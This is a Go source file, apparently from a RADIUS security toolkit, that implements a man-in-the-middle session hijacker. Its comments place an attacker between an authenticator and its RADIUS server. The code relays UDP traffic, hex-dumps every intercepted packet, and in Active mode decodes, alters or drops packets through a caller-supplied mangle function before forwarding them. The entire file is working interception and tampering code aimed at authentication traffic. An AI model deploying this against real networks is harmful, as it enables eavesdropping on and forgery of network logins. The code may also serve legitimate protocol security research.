package session

import (
	"encoding/hex"
	"fmt"
	"net"
	"radius/radiuspacket"
	"radius/utils"
	"strconv"
)

type Mode uint

const (
	Passive Mode = 0
	Active  Mode = 1
)

type MangleFunc func(packet *radiuspacket.RadiusPacket, from net.UDPAddr, to net.UDPAddr) bool

//Session between host and guest to be hijacked.
//The attacker must be placed between the authenticator and the authenticator server.
//hostName is the target RADIUS authenticator
type Session struct {
	hostName string //Target RADIUS server
	ports    []int  //Target ports
	mode     Mode
}

type udpData struct {
	buff       []byte
	senderAddr net.UDPAddr
	dstPort    int
}

type clientData struct {
	clientAddr net.UDPAddr
	connection *net.UDPConn
	mappedPort int //Port in case that direct mapping is not possible (port already in use)
}

const protocol = "udp"

//Receives UDP packets and writes the result in a channel for asyncronous management of the packets
func receiveUDPPacket(conn *net.UDPConn, dstPort int, channel chan udpData) {

	buff := make([]byte, 2048)

	for {
		n, addr, err := conn.ReadFromUDP(buff)
		if n > 0 {
			res := make([]byte, n)
			// Copy the buffer so it doesn't get changed while read by the recipient.
			copy(res, buff[:n])

			udpData := udpData{
				buff:       res,
				senderAddr: *addr,
				dstPort:    dstPort,
			}

			channel <- udpData
		}
		if err != nil {
			close(channel)
			break
		}
	}

}

func setupUDPServer(port int) *net.UDPConn {

	addrToListen := ":" + strconv.FormatUint(uint64(port), 10)

	//Build the address
	localAddr, err := net.ResolveUDPAddr(protocol, addrToListen)

	if err != nil {
		fmt.Println("Wrong Address")
		return nil
	}

	clientConn, err := net.ListenUDP(protocol, localAddr)

	if err != nil {
		fmt.Println("Error", err)
		return nil
	}

	return clientConn

}

func (session *Session) Init(mode Mode, hostName string, ports ...int) {

	session.mode = mode
	session.hostName = hostName

	session.ports = make([]int, len(ports))

	copy(session.ports, ports)

}

//HijackSession In order to spy the communications between authenticator and authenticator server
func (session *Session) Hijack(mangleFunc MangleFunc) {

	var clients []clientData

	udpChan := make(chan udpData)
	serverConnections := make(map[int]*net.UDPConn)

	for _, port := range session.ports {

		serverConn := setupUDPServer(port)
		serverConnections[port] = serverConn
		go receiveUDPPacket(serverConn, port, udpChan) //Start receiving packets from client towards the RADIUS server

	}

	for {

		//Packet received
		data, more := <-udpChan

		//Channel closed (Problems with one of the sides)
		if !more {
			fmt.Println("Something went wrong...")
			break
		}

		fmt.Println("Message from", data.senderAddr, "to port:", data.dstPort)

		fmt.Println(hex.Dump(data.buff))

		//Forward packet

		if data.senderAddr.IP.Equal(net.ParseIP(
			session.hostName)) && utils.Contains(session.ports, data.senderAddr.Port) { //Came from authenticator server RADIUS

			fmt.Println("From authenticator server")

			//Check if address already seen
			for _, client := range clients {
				if client.mappedPort == data.dstPort {
					fmt.Println("Send to client", client.clientAddr)

					if session.mode == Active {

						packet := radiuspacket.NewRadiusPacket()

						packet.Decode(data.buff)

						forward := mangleFunc(packet, data.senderAddr, client.clientAddr)

						if forward {

							if encoded, raw := packet.Encode(); encoded {
								fmt.Println("Forwarded... ")
								//Redirect our custom mangled packet to the client
								serverConnections[data.senderAddr.Port].WriteToUDP(raw, &client.clientAddr)
							}

						}

					} else {
						//Redirect to client without any treatment
						serverConnections[data.senderAddr.Port].WriteToUDP(data.buff, &client.clientAddr)

					}

					break
				}
			}

		} else { //From authenticator

			fmt.Println("From authenticator ")

			found := false

			var client clientData

			//Check if address already seen
			for _, client = range clients {
				if client.clientAddr.IP.Equal(data.senderAddr.IP) && client.clientAddr.Port == data.senderAddr.Port {
					fmt.Println("Client found.")
					found = true
					break
				}
			}

			if !found {
				//Create client

				fmt.Println("Client not found. Creating... ")

				//Determine free port

				freePort := false
				mappedPort := data.senderAddr.Port //First we try with the sender's port

				for !freePort {
					freePort = true
					for _, client := range clients {
						if client.mappedPort == mappedPort {
							freePort = false
							mappedPort++ //Try next port
							break
						}
					}

				}

				localAddr := net.UDPAddr{
					//IP: net.IPv4(0, 0, 0, 0)
					Port: mappedPort,
				}

				authAddr, err := net.ResolveUDPAddr(protocol, session.hostName+":"+strconv.FormatUint(uint64(data.dstPort), 10))

				if err != nil {
					fmt.Println("Error authAddr ", err)
					return
				}

				conn, err := net.DialUDP(protocol, &localAddr, authAddr)

				if err != nil {
					fmt.Println("Error net.DialUDP ", err)
					return
				}

				client = clientData{
					clientAddr: data.senderAddr,
					connection: conn,
					mappedPort: mappedPort,
				}

				clients = append(clients, client)

				go receiveUDPPacket(client.connection, mappedPort, udpChan) //Start receiving packets from radius server

			}

			fmt.Println("Sending to Radius Server...", client.connection.RemoteAddr().String())

			if session.mode == Active {

				packet := radiuspacket.NewRadiusPacket()

				packet.Decode(data.buff)

				forward := mangleFunc(packet, client.clientAddr, *(client.connection.RemoteAddr().(*net.UDPAddr)))

				if forward {

					if encoded, raw := packet.Encode(); encoded {
						fmt.Println("Forwarded... ")
						client.connection.Write(raw) //Redirect mangled packet to server
					}

				}

			} else {
				//Redirect raw data without any treatment
				client.connection.Write(data.buff)
			}

		}

	}

}
